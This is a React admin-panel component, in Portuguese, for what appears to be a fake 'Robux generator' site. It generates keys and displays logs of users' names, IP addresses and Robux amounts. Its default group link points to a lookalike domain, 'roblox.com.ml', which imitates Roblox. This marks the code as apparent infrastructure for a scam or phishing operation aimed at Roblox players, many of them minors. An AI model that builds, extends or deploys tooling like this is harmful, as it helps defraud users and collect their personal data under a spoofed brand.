"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"

interface AdminPanelProps {
  onLogout: () => void
}

type Tab = "generate" | "logs" | "settings"

export function AdminPanel({ onLogout }: AdminPanelProps) {
  const [activeTab, setActiveTab] = useState<Tab>("generate")
  const [keys, setKeys] = useState<any[]>([])
  const [logs, setLogs] = useState<any[]>([])
  const [groupLink, setGroupLink] = useState("")
  const [newKeyCount, setNewKeyCount] = useState(1)

  useEffect(() => {
    loadKeys()
    loadLogs()
    loadSettings()
  }, [])

  const loadKeys = async () => {
    const response = await fetch("/api/keys")
    const data = await response.json()
    setKeys(data.keys || [])
  }

  const loadLogs = async () => {
    const response = await fetch("/api/logs")
    const data = await response.json()
    setLogs(data.logs || [])
  }

  const loadSettings = async () => {
    const response = await fetch("/api/settings")
    const data = await response.json()
    setGroupLink(data.groupLink || "https://www.roblox.com.ml/communities/5771900249/Generator-Robux")
  }

  // ✅ Corrigido: agora gera as keys e baixa automaticamente em um arquivo .txt
  const generateKeys = async () => {
    const response = await fetch("/api/keys/generate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ count: newKeyCount }),
    })
    const data = await response.json()
    const newKeys = data.keys || []

    setKeys([...keys, ...newKeys])
    setNewKeyCount(1)

    // Cria o arquivo .txt e baixa
    const textContent = newKeys.map((k: any) => k.key).join("\n")
    const blob = new Blob([textContent], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `keys_${new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-")}.txt`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  const saveGroupLink = async () => {
    await fetch("/api/settings", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ groupLink }),
    })
    alert("Link do grupo atualizado!")
  }

  const copyKey = (key: string) => {
    navigator.clipboard.writeText(key)
    alert("Key copiada!")
  }

  return (
    <div className="min-h-screen p-4 relative overflow-hidden">
      {/* Background decorativo */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-20 left-10 w-32 h-32 bg-primary/20 rounded-full blur-3xl" />
        <div className="absolute bottom-20 right-10 w-40 h-40 bg-secondary/20 rounded-full blur-3xl" />
      </div>

      <div className="max-w-6xl mx-auto relative z-10">
        {/* Header */}
        <div className="flex items-center justify-between mb-8 mt-8">
          <div>
            <h1 className="text-4xl font-bold mb-2">
              Painel <span className="text-[#22c55e]">Admin</span>
            </h1>
            <p className="text-muted-foreground">Gerencie keys, logs e configurações</p>
          </div>
          <Button
            onClick={onLogout}
            variant="outline"
            className="h-12 px-6 text-lg font-bold border-2 border-destructive text-destructive hover:bg-destructive/10 bg-transparent"
          >
            Sair
          </Button>
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-6">
          <Button
            onClick={() => setActiveTab("generate")}
            className={`flex-1 h-14 text-lg font-bold ${
              activeTab === "generate"
                ? "bg-[#22c55e] hover:bg-[#16a34a] text-white"
                : "bg-muted hover:bg-muted/80 text-foreground"
            }`}
          >
            Gerar Keys
          </Button>
          <Button
            onClick={() => setActiveTab("logs")}
            className={`flex-1 h-14 text-lg font-bold ${
              activeTab === "logs"
                ? "bg-[#22c55e] hover:bg-[#16a34a] text-white"
                : "bg-muted hover:bg-muted/80 text-foreground"
            }`}
          >
            Logs
          </Button>
          <Button
            onClick={() => setActiveTab("settings")}
            className={`flex-1 h-14 text-lg font-bold ${
              activeTab === "settings"
                ? "bg-[#22c55e] hover:bg-[#16a34a] text-white"
                : "bg-muted hover:bg-muted/80 text-foreground"
            }`}
          >
            Configurações
          </Button>
        </div>

        {/* Content */}
        {activeTab === "generate" && (
          <Card className="p-6 border-2 border-primary/30 bg-card/95 backdrop-blur">
            <h2 className="text-2xl font-bold mb-6">Gerar Novas Keys</h2>
            <div className="flex gap-4 mb-6">
              <Input
                type="number"
                min="1"
                max="50"
                value={newKeyCount}
                onChange={(e) => setNewKeyCount(Number.parseInt(e.target.value) || 1)}
                className="w-32 h-12 text-lg border-2"
              />
              <Button
                onClick={generateKeys}
                className="h-12 px-8 text-lg font-bold bg-[#22c55e] hover:bg-[#16a34a] text-white"
              >
                Gerar Keys
              </Button>
            </div>

            <div className="space-y-3 max-h-[500px] overflow-y-auto">
              {keys.map((keyData, index) => (
                <Card key={index} className="p-4 bg-muted/50 border-2">
                  <div className="flex items-center justify-between">
                    <div className="flex-1">
                      <p className="font-mono text-sm break-all">{keyData.key}</p>
                      <p className="text-xs text-muted-foreground mt-1">
                        Status: {keyData.used ? "Usada" : "Disponível"} | Criada:{" "}
                        {new Date(keyData.createdAt).toLocaleString()}
                      </p>
                    </div>
                    <Button
                      onClick={() => copyKey(keyData.key)}
                      size="sm"
                      className="ml-4 bg-[#22c55e] hover:bg-[#16a34a] text-white"
                    >
                      Copiar
                    </Button>
                  </div>
                </Card>
              ))}
            </div>
          </Card>
        )}

        {activeTab === "logs" && (
          <Card className="p-6 border-2 border-primary/30 bg-card/95 backdrop-blur">
            <h2 className="text-2xl font-bold mb-6">Logs de Uso</h2>
            <div className="space-y-3 max-h-[600px] overflow-y-auto">
              {logs.map((log, index) => (
                <Card key={index} className="p-4 bg-muted/50 border-2">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p className="text-sm text-muted-foreground">Key</p>
                      <p className="font-mono text-sm">{log.key.substring(0, 20)}...</p>
                    </div>
                    <div>
                      <p className="text-sm text-muted-foreground">Usuário</p>
                      <p className="font-medium">{log.username || "N/A"}</p>
                    </div>
                    <div>
                      <p className="text-sm text-muted-foreground">Ação</p>
                      <p className="font-medium">{log.action}</p>
                    </div>
                    <div>
                      <p className="text-sm text-muted-foreground">Data/Hora</p>
                      <p className="text-sm">{new Date(log.timestamp).toLocaleString()}</p>
                    </div>
                    {log.amount && (
                      <div>
                        <p className="text-sm text-muted-foreground">Robux</p>
                        <p className="font-medium text-[#22c55e]">{log.amount}</p>
                      </div>
                    )}
                    <div>
                      <p className="text-sm text-muted-foreground">IP</p>
                      <p className="text-sm font-mono">{log.ip || "N/A"}</p>
                    </div>
                  </div>
                </Card>
              ))}
            </div>
          </Card>
        )}

        {activeTab === "settings" && (
          <Card className="p-6 border-2 border-primary/30 bg-card/95 backdrop-blur">
            <h2 className="text-2xl font-bold mb-6">Configurações</h2>
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-medium mb-2">Link do Grupo Roblox</label>
                <Input
                  type="text"
                  value={groupLink}
                  onChange={(e) => setGroupLink(e.target.value)}
                  className="h-12 text-lg border-2 mb-4"
                  placeholder="https://www.roblox.com/..."
                />
                <Button
                  onClick={saveGroupLink}
                  className="h-12 px-8 text-lg font-bold bg-[#22c55e] hover:bg-[#16a34a] text-white"
                >
                  Salvar Link
                </Button>
              </div>
            </div>
          </Card>
        )}

        <div className="mt-6 flex items-center justify-center gap-2 text-sm text-muted-foreground">
          <div className="w-2 h-2 bg-[#22c55e] rounded-full animate-pulse" />
          <span>By Soneca</span>
        </div>
      </div>
    </div>
  )
}
